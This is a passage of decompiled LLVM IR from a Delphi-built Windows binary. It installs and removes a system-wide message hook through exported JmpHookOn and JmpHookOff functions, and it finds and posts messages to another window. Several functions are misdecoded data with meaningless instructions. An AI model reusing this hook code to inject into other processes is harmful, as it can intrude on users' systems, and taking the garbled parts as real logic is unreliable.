  store i32 ptrtoint (i32* @global_var_405f48 to i32), i32* %49, align 4, !insn.addr !1124
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1125
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1125
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %51, align 4, !insn.addr !1125
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1126
  %53 = call i32 @function_405bc0(), !insn.addr !1127
  %54 = call i32 @function_405c40(), !insn.addr !1128
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1129
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1129
  store i32 ptrtoint ([11 x i8]* @global_var_405f54 to i32), i32* %56, align 4, !insn.addr !1129
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1130
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1130
  store i32 %arg2, i32* %58, align 4, !insn.addr !1130
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1131
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1131
  store i32 ptrtoint (i32* @global_var_405f48 to i32), i32* %60, align 4, !insn.addr !1131
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1132
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1132
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %62, align 4, !insn.addr !1132
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1133
  %64 = call i32 @function_405bc0(), !insn.addr !1134
  %65 = call i32 @function_405c40(), !insn.addr !1135
  %66 = call i32 @function_405bc0(), !insn.addr !1136
  %67 = call i32 @function_405c40(), !insn.addr !1137
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1138
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1138
  store i32 ptrtoint ([8 x i8]* @global_var_405f78 to i32), i32* %69, align 4, !insn.addr !1138
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1139
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1139
  store i32 %arg1, i32* %71, align 4, !insn.addr !1139
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1140
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1140
  store i32 ptrtoint (i32* @global_var_405f48 to i32), i32* %73, align 4, !insn.addr !1140
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1141
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1141
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %75, align 4, !insn.addr !1141
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1142
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1142
  store i32 ptrtoint ([6 x i8]* @global_var_405f88 to i32), i32* %77, align 4, !insn.addr !1142
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1143
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1143
  store i32 %arg2, i32* %79, align 4, !insn.addr !1143
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1144
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1144
  store i32 ptrtoint (i32* @global_var_405f48 to i32), i32* %81, align 4, !insn.addr !1144
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1145
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1145
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %83, align 4, !insn.addr !1145
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1146
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1146
  store i32 ptrtoint ([10 x i8]* @global_var_405f98 to i32), i32* %85, align 4, !insn.addr !1146
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1147
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1147
  store i32 %arg3, i32* %87, align 4, !insn.addr !1147
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1148
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1148
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %89, align 4, !insn.addr !1148
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1149
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1149
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %91, align 4, !insn.addr !1149
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1150
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1150
  store i32 %arg4, i32* %93, align 4, !insn.addr !1150
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1151
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1151
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %95, align 4, !insn.addr !1151
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1152
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1152
  store i32 ptrtoint (i32* @global_var_405fac to i32), i32* %97, align 4, !insn.addr !1152
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1153
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405f0c to i32), i32* %99, align 4, !insn.addr !1153
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1154
  %101 = call i32 @function_405bc0(), !insn.addr !1155
  %102 = call i32 @function_405c40(), !insn.addr !1156
  %103 = call i32 @function_405bc0(), !insn.addr !1157
  %104 = call i32 @function_405c40(), !insn.addr !1158
  %105 = call i32 @function_405bb4(), !insn.addr !1159
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1160
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1160
  br label %dec_label_pc_405eac, !insn.addr !1160

dec_label_pc_405eac:                              ; preds = %dec_label_pc_405cea, %dec_label_pc_405c7c
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1161
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1161
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1162
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1163
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1164
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1164
  store i32 4218600, i32* %110, align 4, !insn.addr !1164
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1165
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1166
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1167
  ret i32 %113, !insn.addr !1168
}

define i32 @function_405ee1() local_unnamed_addr {
dec_label_pc_405ee1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1169
  ret i32 %0, !insn.addr !1169
}

define i32 @function_405ee6() local_unnamed_addr {
dec_label_pc_405ee6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1170
}

define i32 @function_405ee8(i32 %arg1) local_unnamed_addr {
dec_label_pc_405ee8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1171
}

define i32 @function_405fb3() local_unnamed_addr {
dec_label_pc_405fb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1172
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1172
  store i32 %3, i32* %4, align 4, !insn.addr !1172
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1173
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1173
  %9 = add i8 %6, %8, !insn.addr !1173
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1173
  store i8 %9, i8* %10, align 1, !insn.addr !1173
  %11 = add i32 %2, 85, !insn.addr !1174
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1174
  %13 = load i8, i8* %12, align 1, !insn.addr !1174
  %14 = trunc i32 %1 to i8, !insn.addr !1174
  %15 = add i8 %13, %14, !insn.addr !1174
  store i8 %15, i8* %12, align 1, !insn.addr !1174
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1175
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1175
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1175
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1176
  %18 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1177
  %19 = add i32 %18, 1, !insn.addr !1177
  %20 = icmp eq i32 %19, 0, !insn.addr !1177
  store i32 %19, i32* @global_var_4096b8, align 4, !insn.addr !1177
  %21 = icmp eq i1 %20, false, !insn.addr !1178
  br i1 %21, label %dec_label_pc_405fed, label %dec_label_pc_405fd9, !insn.addr !1178

dec_label_pc_405fd9:                              ; preds = %dec_label_pc_405fb3
  %22 = call i32 @"@LStrClr"(), !insn.addr !1179
  %23 = call i32 @"@LStrClr"(), !insn.addr !1180
  br label %dec_label_pc_405fed, !insn.addr !1180

dec_label_pc_405fed:                              ; preds = %dec_label_pc_405fd9, %dec_label_pc_405fb3
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1181
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1182
  ret i32 0, !insn.addr !1183
}

define i32 @function_405ffb() local_unnamed_addr {
dec_label_pc_405ffb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1184
  ret i32 %0, !insn.addr !1184
}

define i32 @function_406000() local_unnamed_addr {
dec_label_pc_406000:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1185
}

define i32 @function_406002(i32 %arg1) local_unnamed_addr {
dec_label_pc_406002:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1186
}

define i32 @function_406004() local_unnamed_addr {
dec_label_pc_406004:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !1187
  %2 = add i32 %1, -1, !insn.addr !1187
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !1187
  ret i32 %0, !insn.addr !1188
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1189
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1190
  %2 = icmp eq i32 %0, 0, !insn.addr !1191
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1192
  br i1 %2, label %dec_label_pc_406116, label %dec_label_pc_406026, !insn.addr !1192

dec_label_pc_406026:                              ; preds = %dec_label_pc_40600c
  %3 = call i32 @function_4036c8(), !insn.addr !1193
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1194
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1194
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1194
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1195
  %7 = icmp eq i1 %6, false, !insn.addr !1196
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1197
  br i1 %7, label %dec_label_pc_406116, label %dec_label_pc_406041, !insn.addr !1197

dec_label_pc_406041:                              ; preds = %dec_label_pc_406026
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_406124 to i32*), i8* null, i8* %8), !insn.addr !1198
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1198
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1199
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1199
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1200
  %13 = icmp eq i1 %12, false, !insn.addr !1201
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1202
  br i1 %13, label %dec_label_pc_406116, label %dec_label_pc_40606a, !insn.addr !1202

dec_label_pc_40606a:                              ; preds = %dec_label_pc_406041
  %14 = call i32 @function_4034c8(), !insn.addr !1203
  %15 = add i32 %14, 22, !insn.addr !1204
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1205
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1205
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1206
  %18 = icmp eq i32* %17, null, !insn.addr !1207
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1208
  br i1 %18, label %dec_label_pc_406116, label %dec_label_pc_406089, !insn.addr !1208

dec_label_pc_406089:                              ; preds = %dec_label_pc_40606a
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1209
  %20 = icmp eq i32* %19, null, !insn.addr !1210
  %21 = icmp eq i1 %20, false, !insn.addr !1211
  br i1 %21, label %dec_label_pc_40609d, label %dec_label_pc_406095, !insn.addr !1211

dec_label_pc_406095:                              ; preds = %dec_label_pc_406089
  %22 = bitcast i32* %17 to i8*, !insn.addr !1212
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1212
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1212
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1213
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1214
  br label %dec_label_pc_406116, !insn.addr !1214

dec_label_pc_40609d:                              ; preds = %dec_label_pc_406089
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1206
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1209
  store i32 20, i32* %19, align 4, !insn.addr !1215
  %27 = add i32 %26, 4, !insn.addr !1216
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1216
  store i32 0, i32* %28, align 4, !insn.addr !1216
  %29 = add i32 %26, 8, !insn.addr !1217
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1217
  store i32 0, i32* %30, align 4, !insn.addr !1217
  %31 = add i32 %26, 12, !insn.addr !1218
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1218
  store i32 0, i32* %32, align 4, !insn.addr !1218
  %33 = add i32 %26, 16, !insn.addr !1219
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1219
  store i32 0, i32* %34, align 4, !insn.addr !1219
  %35 = call i32 @function_4036c8(), !insn.addr !1220
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1221
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1221
  %37 = add i32 %26, 20, !insn.addr !1222
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1223
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1224
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1225
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1226
  %42 = call i32 @function_407420(i32 4219180, i32 2000, i32 -1), !insn.addr !1227
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1228
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1228
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1229
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1229
  %46 = icmp eq i1 %45, false, !insn.addr !1230
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1231
  br i1 %46, label %dec_label_pc_406116, label %dec_label_pc_406107, !insn.addr !1231

dec_label_pc_406107:                              ; preds = %dec_label_pc_40609d
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1232
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1232
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1233
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1233
  br label %dec_label_pc_406116, !insn.addr !1233

dec_label_pc_406116:                              ; preds = %dec_label_pc_406107, %dec_label_pc_40609d, %dec_label_pc_406095, %dec_label_pc_40606a, %dec_label_pc_406041, %dec_label_pc_406026, %dec_label_pc_40600c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1234
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1234
  %51 = load i32, i32* %50, align 4, !insn.addr !1234
  ret i32 %51, !insn.addr !1235
}

define i32 @function_406121() local_unnamed_addr {
dec_label_pc_406121:
  %.reg2mem = alloca i32, !insn.addr !1236
  %.pre-phi.reg2mem = alloca i8*, !insn.addr !1236
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1236
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1236
  store i8 %6, i8* %7, align 1, !insn.addr !1236
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1237
  %10 = udiv i32 %4, 256, !insn.addr !1237
  %11 = trunc i32 %10 to i8, !insn.addr !1237
  %12 = add i8 %9, %11, !insn.addr !1237
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1237
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1237
  store i8 %12, i8* %14, align 1, !insn.addr !1237
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1238
  %17 = add i32 %4, 6, !insn.addr !1238
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1238
  %19 = zext i1 %16 to i32, !insn.addr !1238
  %20 = and i32 %4, -65536, !insn.addr !1238
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1239
  %23 = or i1 %16, %22, !insn.addr !1239
  %24 = add i32 %18, 6, !insn.addr !1239
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1239
  %26 = zext i1 %23 to i32, !insn.addr !1239
  %27 = and i32 %25, 15, !insn.addr !1239
  %28 = or i32 %27, %20, !insn.addr !1239
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1239
  %31 = or i32 %28, %30, !insn.addr !1239
  %32 = inttoptr i32 %31 to i8*
  %33 = load i8, i8* %32, align 1, !insn.addr !1240
  %34 = trunc i32 %27 to i8, !insn.addr !1240
  %35 = xor i8 %33, %34, !insn.addr !1240
  store i8 %35, i8* %32, align 1, !insn.addr !1240
  %36 = add i32 %0, 1311123697, !insn.addr !1241
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1241
  %38 = load i8, i8* %37, align 1, !insn.addr !1241
  %39 = udiv i32 %3, 256, !insn.addr !1241
  %40 = trunc i32 %39 to i8, !insn.addr !1241
  %41 = add i8 %38, %40, !insn.addr !1241
  store i8 %41, i8* %37, align 1, !insn.addr !1241
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1242
  %43 = load i32, i32* %42, align 4, !insn.addr !1242
  %44 = sub i32 %43, %31, !insn.addr !1242
  store i32 %44, i32* %42, align 4, !insn.addr !1242
  %45 = add i32 %3, 117, !insn.addr !1243
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1243
  %47 = load i8, i8* %46, align 1, !insn.addr !1243
  %48 = add i8 %47, %34, !insn.addr !1243
  %49 = icmp eq i8 %48, 0, !insn.addr !1243
  store i8 %48, i8* %46, align 1, !insn.addr !1243
  store i8* %32, i8** %.pre-phi.reg2mem, !insn.addr !1244
  store i32 %31, i32* %.reg2mem, !insn.addr !1244
  br i1 %49, label %50, label %dec_label_pc_406138, !insn.addr !1244

; <label>:50:                                     ; preds = %dec_label_pc_406121
  %51 = call i32 @function_4061ac(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1244
  %.pre = inttoptr i32 %51 to i8*, !insn.addr !1245
  store i8* %.pre, i8** %.pre-phi.reg2mem, !insn.addr !1244
  store i32 %51, i32* %.reg2mem, !insn.addr !1244
  br label %dec_label_pc_406138, !insn.addr !1244

dec_label_pc_406138:                              ; preds = %dec_label_pc_406121, %50
  %52 = xor i32 %3, %1, !insn.addr !1246
  %.reload = load i32, i32* %.reg2mem
  %.pre-phi.reload = load i8*, i8** %.pre-phi.reg2mem
  %53 = trunc i32 %3 to i16, !insn.addr !1247
  %54 = inttoptr i32 %52 to i32*, !insn.addr !1247
  %55 = load i32, i32* %54, align 4, !insn.addr !1247
  call void @__asm_outsd(i16 %53, i32 %55), !insn.addr !1247
  %56 = inttoptr i32 %52 to i8*, !insn.addr !1248
  %57 = load i8, i8* %56, align 1, !insn.addr !1248
  call void @__asm_outsb(i16 %53, i8 %57), !insn.addr !1248
  %58 = load i8, i8* %.pre-phi.reload, align 1, !insn.addr !1245
  %59 = trunc i32 %.reload to i8, !insn.addr !1245
  %60 = add i8 %58, %59, !insn.addr !1245
  store i8 %60, i8* %.pre-phi.reload, align 1, !insn.addr !1245
  %61 = call i32 @__asm_iretd(), !insn.addr !1249
  %62 = add i32 %2, -117, !insn.addr !1250
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1250
  %64 = load i8, i8* %63, align 1, !insn.addr !1250
  %65 = add i8 %64, -69, !insn.addr !1250
  store i8 %65, i8* %63, align 1, !insn.addr !1250
  %66 = call i8 @__asm_in(i16 -11077), !insn.addr !1251
  %67 = add i32 %2, 16, !insn.addr !1252
  %68 = inttoptr i32 %67 to i32*, !insn.addr !1252
  %69 = load i32, i32* %68, align 4, !insn.addr !1252
  %70 = add i32 %2, 12, !insn.addr !1253
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1253
  %72 = load i32, i32* %71, align 4, !insn.addr !1253
  %73 = add i32 %2, 8, !insn.addr !1254
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1254
  %75 = load i32, i32* %74, align 4, !insn.addr !1254
  %76 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1255
  %77 = inttoptr i32 %69 to i32*, !insn.addr !1256
  %78 = call i32 @CallNextHookEx(i32* %77, i32 %72, i32 %75, i32 %76), !insn.addr !1256
  ret i32 %78, !insn.addr !1257
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_406168:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4219208 to i32*), i32 3), !insn.addr !1258
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1258
  store i32 %2, i32* @global_var_4096c4, align 4, !insn.addr !1259
  %3 = icmp eq i32* %1, null, !insn.addr !1260
  %4 = icmp eq i1 %3, false, !insn.addr !1261
  %5 = sext i1 %4 to i32, !insn.addr !1262
  ret i32 %5, !insn.addr !1263
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_406194:
  %0 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1264
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1265
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1265
  %3 = sext i1 %2 to i32, !insn.addr !1265
  ret i32 %3, !insn.addr !1266
}

define i32 @function_4061ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4061ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1267
  call void @__writefsdword(i32 %0, i32 %1), !insn.addr !1268
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1269
  %3 = add i32 %2, 1, !insn.addr !1269
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1269
  %4 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1270
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1271
  ret i32 0, !insn.addr !1272
}

define i32 @function_4061c5() local_unnamed_addr {
dec_label_pc_4061c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1273
  ret i32 %0, !insn.addr !1273
}

define i32 @function_4061ca() local_unnamed_addr {
dec_label_pc_4061ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1274
}

define i32 @function_4061cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4061cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1275
}

define i32 @function_4061d0() local_unnamed_addr {
dec_label_pc_4061d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1276
  %2 = add i32 %1, -1, !insn.addr !1276
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1276
  ret i32 %0, !insn.addr !1277
}

define i32 @function_4061d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4061d8:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1278
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %1 to i8
  %4 = trunc i32 %0 to i8, !insn.addr !1279
  %5 = add i8 %3, %4, !insn.addr !1279
  %6 = inttoptr i32 %1 to i8*, !insn.addr !1279
  store i8 %5, i8* %6, align 1, !insn.addr !1279
  %7 = trunc i32 %2 to i8, !insn.addr !1280
  %8 = mul i32 %2, 2, !insn.addr !1280
  %9 = inttoptr i32 %8 to i8*, !insn.addr !1280
  %10 = load i8, i8* %9, align 2, !insn.addr !1280
  %11 = xor i8 %10, %7, !insn.addr !1280
  %12 = zext i8 %11 to i32, !insn.addr !1280
  %13 = and i32 %2, -256, !insn.addr !1280
  %14 = or i32 %13, %12, !insn.addr !1280
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1281
  %16 = load i8, i8* %15, align 1, !insn.addr !1281
  %17 = add i8 %11, %4, !insn.addr !1281
  %18 = add i8 %17, %16, !insn.addr !1282
  store i8 %18, i8* %15, align 1, !insn.addr !1282
  %19 = add i32 %14, 1, !insn.addr !1283
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1284
  %21 = load i8, i8* %20, align 1, !insn.addr !1284
  %22 = trunc i32 %19 to i8, !insn.addr !1285
  %23 = add i8 %21, %5, !insn.addr !1285
  %24 = add i8 %23, %22, !insn.addr !1286
  store i8 %24, i8* %20, align 1, !insn.addr !1286
  %25 = add i32 %14, 2, !insn.addr !1287
  %26 = inttoptr i32 %25 to i8*, !insn.addr !1288
  %27 = load i8, i8* %26, align 1, !insn.addr !1288
  %28 = add i8 %27, %3, !insn.addr !1288
  store i8 %28, i8* %26, align 1, !insn.addr !1288
  %29 = trunc i32 %arg4 to i16, !insn.addr !1289
  %30 = call i32 @__asm_insd(i16 %29), !insn.addr !1289
  %31 = inttoptr i32 %arg8 to i32*, !insn.addr !1289
  store i32 %30, i32* %31, align 4, !insn.addr !1289
  %32 = call i32 @function_403c90(), !insn.addr !1290
  %33 = icmp slt i32 %32, 0, !insn.addr !1291
  br i1 %33, label %dec_label_pc_40622c, label %dec_label_pc_40626d.loopexit, !insn.addr !1292

dec_label_pc_40622c:                              ; preds = %dec_label_pc_4061d8
  %34 = call i32 @function_403c88(), !insn.addr !1293
  %35 = call i32 @"@DynArraySetLength"(), !insn.addr !1294
  %36 = call i32 @function_403c90(), !insn.addr !1295
  %37 = call i32 @"@LStrAsg"(), !insn.addr !1296
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1297
  br label %dec_label_pc_40626d, !insn.addr !1297

dec_label_pc_40626d.loopexit:                     ; preds = %dec_label_pc_4061d8
  %38 = call i32 @"@LStrCmp"(), !insn.addr !1298
  store i32 0, i32* %ebp.0.reg2mem
  br label %dec_label_pc_40626d

dec_label_pc_40626d:                              ; preds = %dec_label_pc_40626d.loopexit, %dec_label_pc_40622c
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1299
}

define i32 @function_406274() local_unnamed_addr {
dec_label_pc_406274:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1300
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1300
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1300
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1301
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1302
  %3 = add i32 %2, 1, !insn.addr !1302
  %4 = icmp eq i32 %3, 0, !insn.addr !1302
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1302
  %5 = icmp eq i1 %4, false, !insn.addr !1303
  br i1 %5, label %dec_label_pc_40629d, label %dec_label_pc_40628d, !insn.addr !1303

dec_label_pc_40628d:                              ; preds = %dec_label_pc_406274
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1304
  br label %dec_label_pc_40629d, !insn.addr !1304

dec_label_pc_40629d:                              ; preds = %dec_label_pc_40628d, %dec_label_pc_406274
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1305
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1306
  ret i32 0, !insn.addr !1307
}

define i32 @function_4062ab() local_unnamed_addr {
dec_label_pc_4062ab:
